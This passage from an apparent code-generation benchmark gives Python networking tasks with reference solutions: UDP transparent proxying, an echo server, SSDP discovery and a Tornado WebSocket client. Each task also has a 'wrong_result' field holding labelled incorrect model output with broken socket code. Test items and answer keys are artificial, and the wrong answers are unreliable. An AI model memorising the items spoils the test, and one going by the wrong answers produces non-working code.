The socket to use for sending\n    - srcip: Source address tuple (IP, port)\n    - dstip: Destination address tuple (IP, port)\n    - data: The data to send\n  Output: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures UDP listener sockets for transparent proxying and original destination address retrieval.\n  Input:\n    - udp_listener: An object containing v4 and v6 socket instances\n  Output: None\n\nMethod4: setsockopt_error(e: Exception) -> None - Handles permission errors related to socket options and raises a fatal error.\n  Input:\n    - e: The caught PermissionError exception\n  Output: None (raises Fatal exception)",
    "Canonical_solution": "import socket\nimport os\nimport struct\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(\n            4096, socket.CMSG_SPACE(24))\n        dstip = None\n        family = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n                \"-- ignored UDP to %r: \"\n                \"couldn't determine source IP address\\n\" % (dstip,))\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        try:\n            sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        try:\n            udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(\n                socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)\n\n    def setsockopt_error(self, e):\n        raise Fatal(\"Insufficient permissions for tproxy method.\\n\"\n                   \"Your effective UID is %d, not 0. Try rerunning as root.\\n\"\n                   % os.geteuid())",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport struct\n\ndef setsockopt_error(e):\n    raise RuntimeError(\"Failed to set socket options for transparent proxying: {}\".format(e))\n\ndef setup_udp_listener(udp_listener):\n    try:\n        for sock in [udp_listener.v4, udp_listener.v6]:\n            sock.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)\n            sock.setsockopt(socket.SOL_IP, socket.IP_RECVORIGDSTADDR, 1)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    except PermissionError as e:\n        setsockopt_error(e)\n\ndef recv_udp(listener, bufsize):\n    ipver = listener.family\n    data, srcip = listener.recvfrom(bufsize)\n    _, ancdata, _, _ = listener.recvmsg(bufsize, socket.CMSG_SPACE(struct.calcsize('256s')))\n    dstip = None\n    for cmsg_level, cmsg_type, cmsg_data in listener.cmsg_iter(ancdata):\n        if cmsg_level == socket.SOL_IP and cmsg_type == socket.IP_ORIGDSTADDR:\n            sa_family, port, addr = struct.unpack_from('HHL', cmsg_data)\n            if ipver == socket.AF_INET6:\n                sa_family, port, flowinfo, addr = struct.unpack_from('HHLL', cmsg_data)\n                dstip = (socket.inet_ntop(socket.AF_INET6, addr.to_bytes(16, 'big')), port)\n            else:\n                dstip = (socket.inet_ntop(socket.AF_INET, addr.to_bytes(4, 'big')), port)\n            break\n    return srcip, dstip, data\n\ndef send_udp(sock, srcip, dstip, data):\n    ipver = sock.family\n    if ipver == socket.AF_INET6:\n        info = socket.sockaddr_in6(*dstip)\n    else:\n        info = socket.sockaddr_in(*dstip)\n    sock.sendto(data, info)\n```"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a UDP echo server that receives data from clients and sends the same data back to the client.\n\nFunction Description: The function `udp_echo_server` creates a UDP socket, binds it to a specified host and port, and continuously listens for incoming data. When data is received, it echoes the same data back to the sender. The function runs indefinitely until manually stopped.\n\nInput:  \n- `host` (str, optional): The local IP address to bind the socket to. Defaults to 'localhost'.  \n- `port` (int, optional): The port number to bind the socket to. Defaults to 6789.  \n\nOutput: None (The function runs indefinitely and does not return any value.)",
    "Canonical_solution": "from socket import *\n\ndef udp_echo_server(host='localhost', port=6789):\n    server = socket(AF_INET, SOCK_DGRAM)\n    server.bind((host, port))\n    while True:\n        data, addr = server.recvfrom(1024)\n        server.sendto(data, addr)\n    server.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\n\ndef udp_echo_server(host='localhost', port=6789):\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:\n        server_socket.bind((host, port))\n        while True:\n            data, addr = server_socket.recvfrom(4096)\n            server_socket.sendto(data, addr)\n```"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a class for discovering devices on a network using SSDP (Simple Service Discovery Protocol) over UDP multicast. The class should be able to send discovery requests and handle responses from devices.\n\nClass Description: The SSDPDiscover class is responsible for discovering UPnP/DLNA devices on a local network using SSDP. It sends M-SEARCH requests to a multicast address and listens for responses. The class supports both single-socket and multi-socket modes for sending discovery requests.\n\nAttributes:\n- SSDP_ADDRESS: [str] - The multicast address for SSDP (239.255.255.250)\n- SSDP_PORT: [int] - The port number for SSDP (1900)\n- SSDP_MX: [int] - The maximum wait time for responses (in seconds)\n- SSDP_TTL: [int] - The time-to-live for multicast packets\n- SSDP_AMOUNT: [int] - The number of discovery requests to send\n- MSEARCH_PORT: [int] - The local port to bind to for sending discovery requests (0 for random)\n- MSEARCH_MSG: [str] - The M-SEARCH request message template\n- BUFFER_SIZE: [int] - The size of the buffer for receiving responses\n- USE_SINGLE_SOCKET: [bool] - Whether to use a single socket for all requests or one per interface\n- cb_on_device_response: [callable] - Callback function to handle device responses\n- host: [str] - The host address to bind to (None for all interfaces)\n- addresses: [list] - List of local IPv4 addresses\n\nMethods:\n- __init__(cb_on_device_response, host=None) -> [None] - Initializes the SSDPDiscover instance with a callback for device responses and an optional host address.\n- refresh_addresses() -> [None] - Refreshes the list of local IPv4 addresses.\n- search(ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None) -> [None] - Initiates the device discovery process with optional parameters for TTL, MX, and request amount.\n- _search(host, ssdp_ttl, ssdp_mx, ssdp_amount) -> [None] - Internal method to perform the discovery process for a specific host.\n- _send_discover(sock, ssdp_mx) -> [None] - Internal method to send an M-SEARCH request using the provided socket.",
    "Canonical_solution": "import socket\nimport threading\nimport logging\nimport chardet\nimport traceback\nimport pulseaudio_dlna.utils.network\nimport pulseaudio_dlna.plugins.dlna.ssdp\n\nlogger = logging.getLogger('pulseaudio_dlna.discover')\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = '239.255.255.250'\n    SSDP_PORT = 1900\n    SSDP_MX = 3\n    SSDP_TTL = 10\n    SSDP_AMOUNT = 5\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = '\\r\\n'.join([\n        'M-SEARCH * HTTP/1.1',\n        'HOST: {host}:{port}',\n        'MAN: \"ssdp:discover\"',\n        'MX: {mx}',\n        'ST: ssdp:all',\n    ]) + '\\r\\n' * 2\n    BUFFER_SIZE = 1024\n    USE_SINGLE_SOCKET = True\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = pulseaudio_dlna.utils.network.ipv4_addresses()\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        ssdp_mx = ssdp_mx or self.SSDP_MX\n        ssdp_ttl = ssdp_ttl or self.SSDP_TTL\n        ssdp_amount = ssdp_amount or self.SSDP_AMOUNT\n\n        if self.USE_SINGLE_SOCKET:\n            self._search(self.host or '', ssdp_ttl, ssdp_mx, ssdp_amount)\n        else:\n            if self.host:\n                self._search(self.host, ssdp_ttl, ssdp_mx, ssdp_amount)\n            else:\n                threads = []\n                for addr in self.addresses:\n                    thread = threading.Thread(\n                        target=self._search,\n                        args=[addr, ssdp_ttl, ssdp_mx, ssdp_amount])\n                    threads.append(thread)\n                try:\n                    for thread in threads:\n                        thread.start()\n                    for thread in threads:\n                        thread.join()\n                except:\n                    traceback.print_exc()\n\n    def _search(self, host, ssdp_ttl, ssdp_mx, ssdp_amount):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        sock.settimeout(ssdp_mx)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ssdp_ttl)\n        sock.bind((host, self.MSEARCH_PORT))\n\n        for i in range(1, ssdp_amount + 1):\n            t = threading.Timer(\n                float(i) / 2, self._send_discover, args=[sock, ssdp_mx])\n            t.start()\n\n        while True:\n            try:\n                header, address = sock.recvfrom(self.BUFFER_SIZE)\n                if self.cb_on_device_response:\n                    guess = chardet.detect(header)\n                    header = header.decode(guess['encoding'])\n                    header = pulseaudio_dlna.plugins.dlna.ssdp._get_header_map(header)\n                    self.cb_on_device_response(header, address)\n            except socket.timeout:\n                break\n        sock.close()\n\n    def _send_discover(self, sock, ssdp_mx):\n        msg = self.MSEARCH_MSG.format(\n            host=self.SSDP_ADDRESS, port=self.SSDP_PORT, mx=ssdp_mx)\n        if self.USE_SINGLE_SOCKET:\n            for addr in self.addresses:\n                sock.setsockopt(\n                    socket.SOL_IP, socket.IP_MULTICAST_IF,\n                    socket.inet_aton(addr))\n                sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))\n        else:\n            sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nimport time\nfrom ipaddress import IPv4Address, IPv4Network\nimport netifaces\n\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = \"239.255.255.250\"\n    SSDP_PORT = 1900\n    SSDP_MX = 5\n    SSDP_TTL = 4\n    SSDP_AMOUNT = 3\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = (\n        \"M-SEARCH * HTTP/1.1\\r\\n\"\n        \"HOST: {host}:{port}\\r\\n\"\n        \"MAN: \\\"ssdp:discover\\\"\\r\\n\"\n        \"MX: {mx}\\r\\n\"\n        \"ST: upnp:rootdevice\\r\\n\"\n        \"\\r\\n\"\n    )\n    BUFFER_SIZE = 65507\n    USE_SINGLE_SOCKET = False\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = []\n        for interface in netifaces.interfaces():\n            addrs = netifaces.ifaddresses(interface)\n            if netifaces.AF_INET in addrs:\n                for link in addrs[netifaces.AF_INET]:\n                    if \"addr\" in link and not link[\"addr\"].startswith(\"127.\"):\n                        self.addresses.append(link[\"addr\"])\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        ssdp_ttl = ssdp_ttl or self.SSDP_TTL\n        ssdp_mx = ssdp_mx or self.SSDP_MX\n        ssdp_amount = ssdp_amount or self.SSDP_AMOUNT\n\n        if self.USE_SINGLE_SOCKET:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n            sock.settimeout(ssdp_mx + 1)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ssdp_ttl)\n            sock.bind((\"\", self.MSEARCH_PORT))\n            self._search(None, ssdp_ttl, ssdp_mx, ssdp_amount, sock)\n        else:\n            threads = []\n            for address in self.addresses:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n                sock.settimeout(ssdp_mx + 1)\n                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ssdp_ttl)\n                sock.bind((address, self.MSEARCH_PORT))\n                thread = threading.Thread(target=self._search, args=(address, ssdp_ttl, ssdp_mx, ssdp_amount, sock))\n                thread.start()\n                threads.append(thread)\n            for t in threads:\n                t.join()\n\n    def _search(self, host, ssdp_ttl, ssdp_mx, ssdp_amount, sock):\n        for _ in range(ssdp_amount):\n            self._send_discover(sock, ssdp_mx)\n            try:\n                while True:\n                    data, addr = sock.recvfrom(self.BUFFER_SIZE)\n                    self.cb_on_device_response(data.decode(), addr)\n            except socket.timeout:\n                pass\n            time.sleep(1)\n\n    def _send_discover(self, sock, ssdp_mx):\n        message = self.MSEARCH_MSG.format(\n            host=self.SSDP_ADDRESS,\n            port=self.SSDP_PORT,\n            mx=ssdp_mx\n        )\n        sock.sendto(message.encode(), (self.SSDP_ADDRESS, self.SSDP_PORT))\n```"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Implement a UDP socket handler class that provides advanced UDP communication capabilities, including receiving original destination addresses and supporting both IPv4 and IPv6 transparent proxying.\n\nClass Description: UDPSocketHandler is a utility class designed to handle UDP socket operations with special features like retrieving original destination addresses and supporting transparent proxying. It provides methods for receiving UDP packets with ancillary data, sending UDP packets with specific source addresses, and setting up UDP listeners with appropriate socket options.\n\nAttributes:\n- recvmsg: Optional[str] - Stores the detected implementation method for recvmsg ('python', 'socket_ext', or None)\n\nMethods:\n- _detect_recvmsg_implementation() -> Optional[str] - Detects available recvmsg implementation methods\n- recv_udp(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Receives UDP data with source and destination address information\n- _recv_udp_python(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Python native implementation of recv_udp\n- _recv_udp_socket_ext(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - socket_ext implementation of recv_udp\n- _recv_udp_fallback(listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes] - Fallback implementation without ancillary data support\n- send_udp(sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None - Sends UDP data with specified source address\n- setup_udp_listener(udp_listener: socket.socket) -> None - Configures UDP listener socket with transparent proxying options",
    "Canonical_solution": "import struct\nimport socket\nfrom typing import Optional, Tuple, Any\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = self._detect_recvmsg_implementation()\n        \n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            import socket as pythonsocket\n            getattr(pythonsocket.socket, \"recvmsg\")\n            return \"python\"\n        except AttributeError:\n            try:\n                import socket_ext\n                getattr(socket_ext.socket, \"recvmsg\")\n                return \"socket_ext\"\n            except ImportError:\n                return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == \"python\":\n            return self._recv_udp_python(listener, bufsize)\n        elif self.recvmsg == \"socket_ext\":\n            return self._recv_udp_socket_ext(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, ancdata, msg_flags, srcip = listener.recvmsg(4096, socket.CMSG_SPACE(24))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data)\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        srcip, data, adata, flags = listener.recvmsg((bufsize,), socket.CMSG_SPACE(24))\n        dstip = None\n        for a in adata:\n            if a.cmsg_level == socket.SOL_IP and a.cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif a.cmsg_level == SOL_IPV6 and a.cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data[0])\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, srcip = listener.recvfrom(bufsize)\n        return (srcip, None, data)\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if not srcip:\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        if hasattr(udp_listener, 'v4') and udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if hasattr(udp_listener, 'v6') and udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport struct\nimport os\nfrom typing import Optional, Tuple, Any, cast\n\nclass UDPSocketHandler:\n    recvmsg: Optional[str] = None\n\n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            from socket import socket, AF_INET, SOCK_DGRAM\n            s = socket(AF_INET, SOCK_DGRAM)\n            s.getsockopt(socket.SOL_SOCKET, socket.SO_RXQ_OVFL)\n            s.close()\n            return 'socket_ext'\n        except (ImportError, AttributeError, OSError):\n            pass\n        try:\n            from socket import CMSG_LEN, SOL_IP, IP_PKTINFO\n            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            s.setsockopt(SOL_IP, IP_PKTINFO, 1)\n            s.close()\n            return 'python'\n        except (ImportError, AttributeError, OSError):\n            return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg is None:\n            self.recvmsg = self._detect_recvmsg_implementation()\n\n        if self.recvmsg == 'socket_ext':\n            return self._recv_udp_socket_ext(listener, bufsize)\n        elif self.recvmsg == 'python':\n            return self._recv_udp_python(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, addr = listener.recvfrom(bufsize)\n        ancdata = []\n        cmsg_len = 0\n        msg_controllen = 0\n        if hasattr(socket, 'CMSG_SPACE'):\n            msg_control = bytearray(4096)\n            msg_controllen = len(msg_control)\n            data, ancdata, msg_flags, addr = listener.recvmsg(bufsize, msg_controllen)\n            for cmsg_level, cmsg_type, cmsg_data in listener.cmsg_iter(ancdata):\n                if cmsg_level == socket.IPPROTO_IP and cmsg_type == socket.IP_PKTINFO:\n                    pktinfo = struct.unpack('4s4xI', cmsg_data)\n                    dstaddr = socket.inet_ntoa(pktinfo[0])\n                    return data, (dstaddr, 0), ancdata\n                elif cmsg_level == socket.IPPROTO_IPV6 and cmsg_type == socket.IPV6_PKTINFO:\n                    pktinfo = struct.unpack('16sI', cmsg_data)\n                    dstaddr = socket.inet_ntop(socket.AF_INET6, pktinfo[0])\n                    return data, (dstaddr, 0), ancdata\n        return data, None, b''\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, ancdata, _, address = listener.recvmsg(bufsize)\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == socket.SO_ORIGINAL_DST:\n                af_inet = struct.Struct('2xH2x')\n                port, = af_inet.unpack(cmsg_data[:af_inet.size])\n                ip = socket.inet_ntoa(cmsg_data[af_inet.size:])\n                return data, (ip, port), cmsg_data\n            elif cmsg_level == socket.SOL_IPV6 and cmsg_type == socket.IPV6_RECVDSTADDR:\n                ip = socket.inet_ntop(socket.AF_INET6, cmsg_data)\n                return data, (ip, 0), cmsg_data\n        return data, None, b''\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, address = listener.recvfrom(bufsize)\n        return data, None, b''\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        sock.sendto(data, dstip)\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        try:\n            udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            if os.name != 'nt':\n                udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n            if hasattr(socket, 'IP_TRANSPARENT'):\n                udp_listener.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)\n            if hasattr(socket, 'IPV6_TRANSPARENT'):\n                udp_listener.setsockopt(socket.SOL_IPV6, socket.IPV6_TRANSPARENT, 1)\n            if hasattr(socket, 'SO_BINDTODEVICE'):\n                pass\n        except Exception as e:\n            pass\n```"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Implement a WebSocket client connection using Tornado in Python, which handles WebSocket protocol communication including connection establishment, message exchange, and connection closure.\n\nClass Description: WebSocketClientConnection is a Tornado-based WebSocket client implementation that manages the lifecycle of a WebSocket connection, including handling messages, pings, and connection events.\n\nAttributes:\n- connect_future: Future - A future representing the connection attempt\n- read_queue: Queue - A queue for incoming messages\n- key: bytes - The WebSocket handshake key\n- _on_message_callback: Optional[Callable] - Callback for received messages\n- close_code: Optional[int] - WebSocket close code\n- close_reason: Optional[str] - WebSocket close reason\n- params: _WebSocketParams - WebSocket connection parameters\n- tcp_client: TCPClient - Underlying TCP client\n- protocol: Optional[WebSocketProtocol] - WebSocket protocol handler\n\nMethods:\n- __init__(request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[Resolver]) -> None - Initializes the WebSocket client connection\n- close(code: Optional[int], reason: Optional[str]) -> None - Closes the WebSocket connection\n- on_connection_close() -> None - Handles connection closure\n- on_ws_connection_close(close_code: Optional[int], close_reason: Optional[str]) -> None - Handles WebSocket-specific connection closure\n- _on_http_response(response: HTTPResponse) -> None - Handles HTTP response during connection\n- headers_received(start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None] - Processes received headers\n- write_message(message: Union[str, bytes, Dict[str, Any]], binary: bool) -> Future[None] - Sends a WebSocket message\n- read_message(callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]] - Reads a message from the queue\n- _on_message(message: Union[None, str, bytes]) -> Optional[Awaitable[None]] - Internal message handler\n- ping(data: bytes) -> None - Sends a ping frame\n- get_websocket_protocol() -> WebSocketProtocol - Creates the WebSocket protocol handler",
    "Canonical_solution": "import abc\nimport asyncio\nimport base64\nimport hashlib\nimport os\nimport struct\nimport tornado\nfrom urllib.parse import urlparse\nimport zlib\nfrom tornado.concurrent import Future\nfrom tornado.escape import utf8, native_str, to_unicode\nfrom tornado import gen, httpclient, httputil\nfrom tornado.ioloop import IOLoop, PeriodicCallback\nfrom tornado.iostream import StreamClosedError, IOStream\nfrom tornado.log import app_log\nfrom tornado.netutil import Resolver\nfrom tornado import simple_httpclient\nfrom tornado.queues import Queue\nfrom tornado.tcpclient import TCPClient\nfrom tornado.util import _websocket_mask\nfrom typing import Optional, Dict, Union, List, Awaitable, Callable, Tuple, Type, Any, cast\n\n_default_max_message_size = 10 * 1024 * 1024\n\nclass WebSocketClientConnection(simple_httpclient._HTTPConnection):\n    def __init__(\n        self,\n        request: httpclient.HTTPRequest,\n        on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n        compression_options: Optional[Dict[str, Any]] = None,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        subprotocols: Optional[List[str]] = None,\n        resolver: Optional[Resolver] = None,\n    ) -> None:\n        self.connect_future = Future()\n        self.read_queue = Queue(1)\n        self.key = base64.b64encode(os.urandom(16))\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams(\n            ping_interval=ping_interval,\n            ping_timeout=ping_timeout,\n            max_message_size=max_message_size,\n            compression_options=compression_options,\n        )\n\n        scheme, sep, rest = request.url.partition(\":\")\n        scheme = {\"ws\": \"http\", \"wss\": \"https\"}[scheme]\n        request.url = scheme + sep + rest\n        request.headers.update(\n            {\n                \"Upgrade\": \"websocket\",\n                \"Connection\": \"Upgrade\",\n                \"Sec-WebSocket-Key\": to_unicode(self.key),\n                \"Sec-WebSocket-Version\": \"13\",\n            }\n        )\n        if subprotocols is not None:\n            request.headers[\"Sec-WebSocket-Protocol\"] = \",\".join(subprotocols)\n        if compression_options is not None:\n            request.headers[\"Sec-WebSocket-Extensions\"] = (\n                \"permessage-deflate; client_max_window_bits\"\n            )\n\n        request.follow_redirects = False\n\n        self.tcp_client = TCPClient(resolver=resolver)\n        super().__init__(\n            None,\n            request,\n            lambda: None,\n            self._on_http_response,\n            104857600,\n            self.tcp_client,\n            65536,\n            104857600,\n        )\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if self.protocol is not None:\n            self.protocol.close(code, reason)\n            self.protocol = None\n\n    def on_connection_close(self) -> None:\n        if not self.connect_future.done():\n            self.connect_future.set_exception(StreamClosedError())\n        self._on_message(None)\n        self.tcp_client.close()\n        super().on_connection_close()\n\n    def on_ws_connection_close(\n        self, close_code: Optional[int] = None, close_reason: Optional[str] = None\n    ) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.on_connection_close()\n\n    def _on_http_response(self, response: httpclient.HTTPResponse) -> None:\n        if not self.connect_future.done():\n            if response.error:\n                self.connect_future.set_exception(response.error)\n            else:\n                self.connect_future.set_exception(\n                    WebSocketError(\"Non-websocket response\")\n                )\n\n    async def headers_received(\n        self,\n        start_line: Union[httputil.RequestStartLine, httputil.ResponseStartLine],\n        headers: httputil.HTTPHeaders,\n    ) -> None:\n        assert isinstance(start_line, httputil.ResponseStartLine)\n        if start_line.code != 101:\n            await super().headers_received(start_line, headers)\n            return\n\n        if self._timeout is not None:\n            self.io_loop.remove_timeout(self._timeout)\n            self._timeout = None\n\n        self.headers = headers\n        self.protocol = self.get_websocket_protocol()\n        self.protocol._process_server_headers(self.key, self.headers)\n        self.protocol.stream = self.connection.detach()\n\n        IOLoop.current().add_callback(self.protocol._receive_frame_loop)\n        self.protocol.start_pinging()\n\n        self.final_callback = None\n        future_set_result_unless_cancelled(self.connect_future, self)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if self.protocol is None:\n            raise WebSocketClosedError(\"Client connection has been closed\")\n        return self.protocol.write_message(message, binary=binary)\n\n    def read_message(\n        self,\n        